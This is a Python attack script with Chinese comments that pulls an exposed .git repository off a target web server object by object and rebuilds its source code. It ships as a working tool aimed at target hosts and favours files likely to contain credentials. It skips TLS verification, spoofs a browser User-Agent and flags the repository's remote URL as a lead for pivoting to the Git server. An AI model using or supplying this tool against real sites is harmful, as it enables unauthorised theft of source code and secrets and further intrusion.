#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""手工 dump 暴露的 .git 仓库 —— git-dumper 跑不通时的备用方案。

用法:
    python3 git_walk_dump.py <base_url> <outdir> [--all] [--verbose]

例:
    python3 git_walk_dump.py https://target/.git/ ./src
    python3 git_walk_dump.py http://1.2.3.4/.git/ ./src --all

base_url 建议以 /.git/ 结尾;给站点根也会自动补 /。

默认只落盘「可能含凭据/入口」的文件(自研目录 + 根目录配置),因为这些才值钱,
且框架/vendor 目录(ThinkPHP/、node_modules/)又大又慢。——all 才全量。

原理(不依赖 git 客户端):
    HEAD -> refs/heads/<branch> -> commit -> 递归 tree -> blob
    对象取回: GET /.git/objects/<sha[:2]>/<sha[2:]>  -> zlib.decompress()

限制: 只对 loose object 有效。仓库若被打包(objects/pack/*.pack),
      loose 取回会 404,末尾会打印 miss 统计 —— 此时需另取 .pack + .idx 解包。
"""
import argparse
import os
import re
import ssl
import sys
import time
import urllib.request
import zlib

CTX = ssl._create_unverified_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36"

# 只抓这些前缀(自研代码/配置),其余框架与 vendor 目录默认跳过
WANT_PREFIX = ("App/", "apps/", "application/", "protected/", "inc/", "conf/",
               "config/", "src/", "server/", "api/", "Common/", "ThinkPHP/Conf/")
WANT_ROOT_EXT = (".php", ".env", ".ini", ".conf", ".yml", ".yaml", ".json", ".sql", ".sh")


def fetch(base, path, tries=3, timeout=25):
    url = base + path.lstrip("/")
    for i in range(tries):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": UA})
            with urllib.request.urlopen(req, context=CTX, timeout=timeout) as r:
                return r.read()
        except Exception:
            time.sleep(0.6 * (i + 1))
    return None


def read_object(base, sha):
    """返回 (type, body);取不到返回 (None, None)。"""
    raw = fetch(base, "objects/%s/%s" % (sha[:2], sha[2:]))
    if not raw:
        return None, None
    try:
        data = zlib.decompress(raw)
    except Exception:
        return None, None
    nul = data.find(b"\x00")
    if nul < 0:
        return None, None
    parts = data[:nul].split()
    if len(parts) < 2:
        return None, None
    return parts[0].decode("ascii", "ignore"), data[nul + 1:]


def parse_tree(body):
    """tree body -> [(mode, name, sha_hex)]"""
    out, p = [], 0
    while p < len(body):
        sp = body.find(b" ", p)
        if sp < 0:
            break
        mode = body[p:sp].decode("ascii", "ignore")
        nul = body.find(b"\x00", sp)
        if nul < 0:
            break
        name = body[sp + 1:nul].decode("utf-8", "ignore")
        sha = body[nul + 1:nul + 21].hex()
        out.append((mode, name, sha))
        p = nul + 21
    return out


def resolve_head(base):
    head = (fetch(base, "HEAD") or b"").decode("utf-8", "ignore").strip()
    m = re.search(r"ref:\s*(\S+)", head)
    if m:
        sha = (fetch(base, m.group(1)) or b"").decode("ascii", "ignore").strip()
        if re.fullmatch(r"[0-9a-f]{40}", sha or ""):
            return sha
    if re.fullmatch(r"[0-9a-f]{40}", head):
        return head
    # 兜底: logs/HEAD 首行末列
    logs = (fetch(base, "logs/HEAD") or b"").decode("utf-8", "ignore")
    m = re.search(r"([0-9a-f]{40})\s+[^\t]*\t", logs)
    return m.group(1) if m else None


def wanted(path, want_all):
    if want_all:
        return True
    if path.startswith(WANT_PREFIX):
        return True
    return "/" not in path and path.lower().endswith(WANT_ROOT_EXT)


def walk(base, sha, prefix, outdir, want_all, stats, depth=0):
    if depth > 24:
        return
    typ, body = read_object(base, sha)
    if typ == "tree":
        for mode, name, sub in parse_tree(body):
            if name in (".", ".."):
                continue
            walk(base, sub, prefix + name + ("/" if mode.startswith("4") else ""),
                 outdir, want_all, stats, depth + 1)
    elif typ == "blob":
        stats["seen"] += 1
        path = prefix.rstrip("/")
        if not wanted(path, want_all):
            return
        dst = os.path.join(outdir, path.replace("/", os.sep))
        os.makedirs(os.path.dirname(dst) or outdir, exist_ok=True)
        with open(dst, "wb") as f:
            f.write(body)
        stats["written"] += 1
    else:
        stats["miss"] += 1


def parse_index(path):
    """辅助: 解析 .git/index v2 -> [(name, sha_hex, size)]
    注意 v2 对齐: total = 62 + len(name); pad = 8 - total % 8 (整除时补 8,不是 0)。
    这个坑踩过: 错位后 3984 条只解析出 284 条。
    """
    data = open(path, "rb").read()
    if data[:4] != b"DIRC":
        return []
    n = int.from_bytes(data[8:12], "big")
    p, out = 12, []
    for _ in range(n):
        base = p
        sha = data[base + 40:base + 60].hex()
        flags = int.from_bytes(data[base + 60:base + 62], "big")
        namelen = flags & 0x0FFF
        name = data[base + 62:base + 62 + namelen].decode("utf-8", "ignore")
        total = 62 + namelen
        pad = 8 - (total % 8)
        p = base + total + pad
        out.append((name, sha, 0))
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("base_url")
    ap.add_argument("outdir")
    ap.add_argument("--all", action="store_true", help="落盘全部文件(慢)")
    args = ap.parse_args()

    base = args.base_url.rstrip("/") + "/"
    if not base.endswith("/.git/"):
        base = base + ".git/"
    os.makedirs(args.outdir, exist_ok=True)

    # 先抓五个高价值元文件,便于即使 tree 走不动也有产出
    for meta in ("HEAD", "config", "logs/HEAD", "COMMIT_EDITMSG", "description"):
        d = fetch(base, meta)
        if d:
            dst = os.path.join(args.outdir, "_meta", meta.replace("/", "_"))
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            open(dst, "wb").write(d)
            print("[meta] %-16s %d B" % (meta, len(d)))

    cfg = fetch(base, "config")
    if cfg:
        m = re.search(rb"url\s*=\s*(\S+)", cfg)
        if m:
            print("[!] remote url = %s  <-- 枢纽线索:直接去打这台 Git 服务" % m.group(1).decode("utf-8", "ignore"))

    sha = resolve_head(base)
    if not sha:
        print("[-] 无法定位 HEAD/commit;仓库可能只有 packed-refs(该文件常被 deny)")
        sys.exit(2)
    print("[*] commit = %s" % sha)

    typ, body = read_object(base, sha)
    if typ != "commit":
        print("[-] commit 对象取不到(多半是 packed 仓库,需另取 pack/idx)")
        sys.exit(3)
    tree = re.search(rb"tree ([0-9a-f]{40})", body).group(1).decode()
    print("[*] root tree = %s" % tree)

    stats = {"seen": 0, "written": 0, "miss": 0}
    walk(base, tree, "", args.outdir, args.all, stats)
    print("[=] blobs seen=%d written=%d miss=%d -> %s"
          % (stats["seen"], stats["written"], stats["miss"], args.outdir))
    if stats["miss"]:
        print("[!] 有 miss:仓库可能部分打包;需要取 objects/pack/*.pack + *.idx 解包")


if __name__ == "__main__":
    main()
